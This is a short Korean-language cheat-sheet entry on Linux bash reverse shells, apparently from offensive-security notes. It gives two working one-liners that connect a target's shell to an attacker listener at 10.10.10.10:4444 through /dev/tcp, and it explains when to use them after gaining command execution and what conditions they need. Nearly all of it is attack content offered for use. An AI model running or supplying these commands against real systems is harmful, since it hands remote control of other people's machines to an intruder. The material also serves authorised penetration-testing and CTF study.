# linux bash reverse shell

> 무엇: bash의 /dev/tcp 의사 장치로 표준 입출력을 소켓에 물려 리스너에 콜백하는 Linux 기본 리버스 셸 원라이너
> 언제: 타깃에서 명령 실행 지점(웹셸·RCE)을 확보했고 bash가 있는 게 확인됐을 때 가장 먼저 시도한다
> 조건: 타깃에 bash 필요(dash·ash는 /dev/tcp 미지원), 끝의 `0>&1`이 빠지면 명령을 못 받고, 공격자 리스너가 먼저 떠 있어야 하며 타깃에서 공격자로 TCP 아웃바운드가 허용돼야 한다

타깃에 bash가 있을 때 가장 먼저 시도한다. `/dev/tcp`는 bash 전용이라 dash/ash(sh)에서는 안 된다.

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

```bash
# bash -i 가 붙지 않는 최소 환경 (read 루프)
exec 5<>/dev/tcp/10.10.10.10/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

- 끝의 `0>&1`이 stdin을 소켓으로 돌린다. 빠지면 명령을 못 받는다.
